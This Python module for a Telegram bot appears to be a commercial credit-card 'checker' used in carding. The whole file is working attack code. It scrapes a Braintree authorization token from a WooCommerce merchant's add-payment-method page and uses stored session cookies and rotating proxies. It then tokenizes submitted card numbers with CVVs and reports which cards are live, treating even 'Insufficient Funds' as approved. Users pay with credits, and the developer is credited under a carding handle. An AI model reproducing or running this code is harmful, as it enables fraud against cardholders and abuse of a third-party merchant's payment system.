# gates/braintree1.py
import requests
import re
import base64
import random
import time
import asyncio
import glob
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from html import escape
from datetime import datetime
import urllib3

# ===== SUPPRESS WARNINGS =====
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Import your DB functions
from db import get_user, update_user

# Premium Emoji IDs
DEAD_MOJI = "5019523782004441717"        # ❌
APPROVED_MOJI = "4958610528588008305"    # ✅
LOADING_MOJI = "5212985021870123409"     # ⏳
GREEN_MOJI = "5323307196807653127"       # 🟢
RED_MOJI = "5323535839391653590"         # ♦️

# ===== COOLDOWN TRACKING SYSTEM =====
b3_user_data = {}

# ===== COOLDOWN SETTINGS =====
COOLDOWN_CONFIG = {
    'owner': {
        'limit': 0,
        'after_1_card': 0,
        'after_2_cards': 0,
        'after_3_cards': 0,
        'reset_after': 60
    },
    'admin': {
        'limit': 5,
        'after_1_card': 5,
        'after_2_cards': 10,
        'after_3_cards': 15,
        'reset_after': 60
    },
    'premium': {
        'limit': 15,
        'after_1_card': 15,
        'after_2_cards': 20,
        'after_3_cards': 25,
        'reset_after': 60
    },
    'free': {
        'limit': 0,
        'after_1_card': 0,
        'after_2_cards': 30,
        'after_3_cards': 40,
        'reset_after': 90
    }
}

def get_user_cooldown_settings(user_id, plan):
    """Get cooldown settings based on user type"""
    from config import ADMIN_IDS, OWNER_ID
    
    if user_id == OWNER_ID:
        return COOLDOWN_CONFIG['owner']
    if user_id in ADMIN_IDS:
        return COOLDOWN_CONFIG['admin']
    
    plan_lower = plan.lower()
    if 'premium' in plan_lower or 'plus' in plan_lower or 'gold' in plan_lower:
        return COOLDOWN_CONFIG['premium']
    
    return COOLDOWN_CONFIG['free']

async def enforce_b3_cooldown(user_id: int, update: Update) -> bool:
    """Smart cooldown system for B3 command"""
    import time
    from config import ADMIN_IDS, OWNER_ID
    
    current_time = time.time()
    
    user_data = await get_user(user_id)
    if not user_data:
        b3_user_data[user_id] = {
            'last_time': 0,
            'card_count': 0,
            'last_reset': current_time
        }
        return True
    
    plan = user_data.get('plan', 'Free')
    settings = get_user_cooldown_settings(user_id, plan)
    
    if 'limit' not in settings:
        settings['limit'] = 0
    
    if settings['limit'] == 0:
        return True
    
    if user_id not in b3_user_data:
        b3_user_data[user_id] = {
            'last_time': 0,
            'card_count': 0,
            'last_reset': current_time
        }
    
    user_stats = b3_user_data[user_id]
    reset_time = settings.get('reset_after', 90)
    
    if current_time - user_stats['last_reset'] > reset_time:
        user_stats['card_count'] = 0
        user_stats['last_reset'] = current_time
    
    card_count = user_stats['card_count']
    
    if card_count == 0:
        required_cooldown = settings.get('after_1_card', 0)
    elif card_count == 1:
        required_cooldown = settings.get('after_2_cards', 30)
    else:
        required_cooldown = settings.get('after_3_cards', 40)
    
    time_since_last = current_time - user_stats['last_time']
    
    if time_since_last < required_cooldown:
        remaining = required_cooldown - time_since_last
        
        if user_id == OWNER_ID:
            user_type = "OWNER"
        elif user_id in ADMIN_IDS:
            user_type = "ADMIN"
        elif 'premium' in plan.lower() or 'plus' in plan.lower():
            user_type = "PREMIUM"
        else:
            user_type = "FREE"
        
        message = f"<tg-emoji emoji-id='{LOADING_MOJI}'>⏳</tg-emoji> {user_type} Cooldown: Please wait {remaining:.0f}s (Card #{card_count + 1})"
        await update.effective_message.reply_text(message, parse_mode=ParseMode.HTML)
        return False
    
    user_stats['last_time'] = current_time
    user_stats['card_count'] += 1
    
    return True

# ===== COOKIE SYSTEM =====
SELECTED_COOKIE_PAIR = None

def discover_cookie_pairs():
    """Discover available cookie pairs"""
    try:
        pattern1 = 'cookies_*-1.txt'
        pattern2 = 'cookies_*-2.txt'
        
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        pairs = []
        for file1 in files1:
            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = f'cookies_{pair_id}-2.txt'
            
            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
        
        return pairs
    except Exception as e:
        print(f"Cookie error: {str(e)}")
        return []

def select_new_cookie_pair_silent():
    """Select new random cookie pair"""
    global SELECTED_COOKIE_PAIR
    
    pairs = discover_cookie_pairs()
    if not pairs:
        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
        return SELECTED_COOKIE_PAIR
    
    selected_pair = random.choice(pairs)
    SELECTED_COOKIE_PAIR = selected_pair
    return selected_pair

def read_cookies_from_file(filename):
    """Read cookies from file"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception:
        return {}

def get_cookies_1():
    """Get first set of cookies"""
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])

def get_cookies_2():
    """Get second set of cookies"""
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])

# ===== SITE CONFIGURATION =====
def get_domain_url():
    """Read domain URL"""
    try:
        with open('site.txt', 'r') as f:
            return f.read().strip()
    except Exception:
        return "https://iditarod.com"

def get_headers():
    """Get headers"""
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

# ===== PROXY SYSTEM =====
def get_random_proxy():
    """Get random proxy - Universal format support"""
    proxy = None
    try:
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            if not proxies:
                print("❌ No proxies found in proxy.txt")
                return {}
            
            proxy = random.choice(proxies)
            print(f"🔌 Raw proxy string: {proxy}")
            
            if '@' in proxy:
                try:
                    auth_part, server_part = proxy.split('@', 1)
                    
                    if ':' in auth_part:
                        username, password = auth_part.split(':', 1)
                    else:
                        return {}
                    
                    if ':' in server_part:
                        host, port = server_part.split(':', 1)
                    else:
                        return {}
                    
                    try:
                        int(port)
                    except:
                        return {}
                    
                    proxy_url = f'http://{username}:{password}@{host}:{port}'
                    print(f"✅ Format 1 (@ format): {host}:{port}")
                    return {
                        'http': proxy_url,
                        'https': proxy_url
                    }
                except Exception as e:
                    print(f"❌ Error parsing @ format: {e}")
            
            parts = proxy.split(':')
            
            if len(parts) == 4:
                host, port, username, password = parts
                try:
                    int(port)
                except:
                    return {}
                
                proxy_url = f'http://{username}:{password}@{host}:{port}'
                print(f"✅ Format 2 (4 parts): {host}:{port}")
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
            
            elif len(parts) >= 5:
                host, port, username, password = parts[:4]
                try:
                    int(port)
                except:
                    return {}
                
                proxy_url = f'http://{username}:{password}@{host}:{port}'
                print(f"✅ Format 3 (5+ parts): {host}:{port}")
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
            
            elif len(parts) == 2:
                host, port = parts
                try:
                    int(port)
                except:
                    return {}
                
                proxy_url = f'http://{host}:{port}'
                print(f"✅ Format 4 (no auth): {host}:{port}")
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
            
            elif len(parts) == 4 and parts[0].replace('.', '').isdigit():
                host, port, username, password = parts
                proxy_url = f'http://{username}:{password}@{host}:{port}'
                print(f"✅ Format 5 (IP format): {host}:{port}")
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
            
            else:
                print(f"❌ Unsupported proxy format: {proxy}")
                
    except FileNotFoundError:
        print("❌ proxy.txt file not found!")
    except Exception as e:
        print(f"❌ Proxy error: {e}")
    
    return {}

# ===== AUTHENTICATION =====
def get_new_auth():
    """Get fresh auth tokens"""
    domain_url = get_domain_url()
    cookies_1 = get_cookies_1()
    headers = get_headers()
    
    proxy = get_random_proxy()
    
    try:
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_1,
            headers=headers,
            proxies=proxy,
            verify=False,
            timeout=30
        )
        
        if response.status_code == 200:
            add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
            if not add_nonce:
                return None, None
            
            i0 = response.text.find('wc_braintree_client_token = ["')
            if i0 != -1:
                i1 = response.text.find('"]', i0)
                token = response.text[i0 + 30:i1]
                try:
                    decoded_text = base64.b64decode(token).decode('utf-8')
                    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                    if au:
                        return add_nonce[0], au[0]
                except Exception:
                    pass
    except Exception:
        pass
    
    return None, None

# ===== BIN LOOKUP =====
def get_bin_info_local(bin_number):
    """Local BIN lookup"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()
            
            if data and 'brand' in data:
                return {
                    'brand': data.get('brand', 'UNKNOWN'),
                    'type': data.get('type', 'UNKNOWN'),
                    'level': data.get('brand', 'UNKNOWN'),
                    'bank': data.get('bank', 'UNKNOWN'),
                    'country': data.get('country_name', 'UNKNOWN'),
                    'emoji': data.get('country_flag', '🏳️')
                }
    except Exception:
        pass
    
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🏳️'
    }

# ===== STATUS CHECKER =====
def check_status(result):
    """Check card status"""
    if "Reason:" in result:
        reason_part = result.split("Reason:", 1)[1].strip()
        
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]
        
        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]
        
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True
        
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False
        
        return "DECLINED", reason_part, False
    
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]
    
    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]
    
    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True
    
    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False
    
    return "DECLINED", result, False

# ===== MAIN CARD CHECK =====
async def check_card_braintree_cookie_system(cc, mm, yy, cvc):
    """Braintree card checker"""
    select_new_cookie_pair_silent()
    
    start_time = time.time()
    
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Authorization failed"
        
        if len(mm) == 1:
            mm = f"0{mm}"
        if len(yy) == 2:
            yy = f"20{yy}"
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
        
        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False,
            timeout=30
        )
        
        if response.status_code != 200:
            return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Tokenization failed: {response.status_code}"
        
        try:
            token_data = response.json()
            if not token_data or 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
                return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Invalid token response"
            
            token = token_data['data']['tokenizeCreditCard']['token']
        except Exception:
            return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Token extraction failed"
        
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False,
            timeout=30
        )
        
        elapsed_time = time.time() - start_time
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            error_div = soup.find('div', class_='woocommerce-notices-wrapper')
            message = error_div.get_text(strip=True) if error_div else "Unknown error"
            
            status, reason, approved = check_status(message)
            
            if approved:
                return f"<tg-emoji emoji-id='{APPROVED_MOJI}'>✅</tg-emoji> APPROVED | Reason: {reason} | Time: {elapsed_time:.2f}s | Cookie: {SELECTED_COOKIE_PAIR['id']}"
            else:
                return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> DECLINED | Reason: {reason} | Time: {elapsed_time:.2f}s | Cookie: {SELECTED_COOKIE_PAIR['id']}"
        else:
            return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Request failed: {response.status_code}"
            
    except Exception as e:
        return f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Error: {str(e)}"

# ===== TELEGRAM BOT HANDLER =====
async def b3_iditarod_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3 command"""
    user = update.effective_user
    
    try:
        if not await enforce_b3_cooldown(user.id, update):
            return
        
        if not await consume_credit(user.id):
            await update.message.reply_text(
                f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> You don't have enough credits.",
                parse_mode=ParseMode.HTML
            )
            return
        
        card_input = None
        
        if context.args:
            raw_text = " ".join(context.args).strip()
            match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", raw_text)
            if match:
                card_input = match.groups()
        
        elif update.message.reply_to_message and update.message.reply_to_message.text:
            match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", update.message.reply_to_message.text)
            if match:
                card_input = match.groups()
        
        if not card_input:
            await update.message.reply_text(
                f"<tg-emoji emoji-id='{LOADING_MOJI}'>⏳</tg-emoji> Usage: <code>/b3 card|mm|yy|cvv</code>\nOr reply to a card message.",
                parse_mode=ParseMode.HTML
            )
            return
        
        card, mm, yy, cvv = card_input
        mm = mm.zfill(2)
        yy = yy[-2:] if len(yy) == 4 else yy
        full_card = f"{card}|{mm}|{yy}|{cvv}"
        
        user_data = await get_user(user.id)
        plan = user_data.get('plan', 'Free') if user_data else 'Free'
        
        processing_text = f"<tg-emoji emoji-id='{LOADING_MOJI}'>⏳</tg-emoji> Processing Braintree Premium Auth... [{plan.upper()}]"
        processing_msg = await update.message.reply_text(processing_text, parse_mode=ParseMode.HTML)
        
        asyncio.create_task(process_b3_cookie_check(update, full_card, processing_msg, user, plan))
        
    except Exception as e:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Command error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML
        )

async def process_b3_cookie_check(update: Update, full_card: str, processing_msg, user, plan):
    """Process B3 check"""
    import time
    start_time = time.time()
    
    try:
        cc, mm, yy, cvv = full_card.split("|")
        
        bin_info = get_bin_info_local(cc[:6])
        brand = bin_info['brand']
        issuer = bin_info['bank']
        country_name = bin_info['country']
        country_flag = bin_info['emoji']
        
        response_message = await check_card_braintree_cookie_system(cc, mm, yy, cvv)
        
        if f'<tg-emoji emoji-id="{APPROVED_MOJI}">✅</tg-emoji> APPROVED' in response_message:
            header_status = f'<tg-emoji emoji-id="{APPROVED_MOJI}">✅</tg-emoji> APPROVED'
        elif f'<tg-emoji emoji-id="{DEAD_MOJI}">❌</tg-emoji> DECLINED' in response_message:
            header_status = f'<tg-emoji emoji-id="{DEAD_MOJI}">❌</tg-emoji> DECLINED'
        else:
            if '<tg-emoji' in response_message:
                emoji_match = re.search(r'(<tg-emoji[^>]*>.[^<]*</tg-emoji>)', response_message)
                if emoji_match:
                    emoji_tag = emoji_match.group(1)
                    if 'DECLINED' in response_message or 'declined' in response_message.lower():
                        header_status = f"{emoji_tag} DECLINED"
                    elif 'APPROVED' in response_message or 'approved' in response_message.lower():
                        header_status = f"{emoji_tag} APPROVED"
                    else:
                        header_status = f"{emoji_tag} UNKNOWN"
                else:
                    header_status = f'<tg-emoji emoji-id="{DEAD_MOJI}">❌</tg-emoji> UNKNOWN'
            else:
                header_status = f'<tg-emoji emoji-id="{DEAD_MOJI}">❌</tg-emoji> UNKNOWN'
        
        if "| Reason:" in response_message:
            reason_part = response_message.split("| Reason:", 1)[1].split("|", 1)[0].strip()
        else:
            clean_response = re.sub(r'<tg-emoji[^>]*>.[^<]*</tg-emoji>\s*', '', response_message)
            reason_part = clean_response.strip()
        
        elapsed_time = round(time.time() - start_time, 2)
        
        DEVELOPER_NAME = "𝙄𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝘾𝙫𝙫⸙™"
        DEVELOPER_LINK = "tg://resolve?domain=DarkCarder05"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
        
        user_id = user.id
        card_count = b3_user_data.get(user_id, {}).get('card_count', 1)
        
        final_text = (
            f"<b>{header_status}</b> [<code>{plan}</code>]\n\n"
            f'<tg-emoji emoji-id="{GREEN_MOJI}">🟢</tg-emoji> 𝘾𝙖𝙧𝙙 #{card_count}\n'
            f"⤷ <code>{escape(full_card)}</code>\n"
            f'<tg-emoji emoji-id="{RED_MOJI}">♦️</tg-emoji> 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➵ 𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝\n'
            f'<tg-emoji emoji-id="{GREEN_MOJI}">🟢</tg-emoji> 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➵ <i><code>{escape(reason_part)}</code></i>\n\n'
            f"<pre>"
            f"𝑩𝒓𝒂𝒏𝒅  ➵ {escape(brand)}\n"
            f"𝑩𝒂𝒏𝒌 ➵ {escape(issuer)}\n"
            f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f'<tg-emoji emoji-id="{GREEN_MOJI}">🟢</tg-emoji> 𝘿𝙀𝙑 ➵ {developer_clickable}\n'
            f'<tg-emoji emoji-id="{RED_MOJI}">♦️</tg-emoji> 𝙏𝙞𝙢𝙚 ➵ {elapsed_time} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨'
        )
        
        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
        
    except Exception as e:
        await processing_msg.edit_text(
            f"<tg-emoji emoji-id='{DEAD_MOJI}'>❌</tg-emoji> Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit"""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False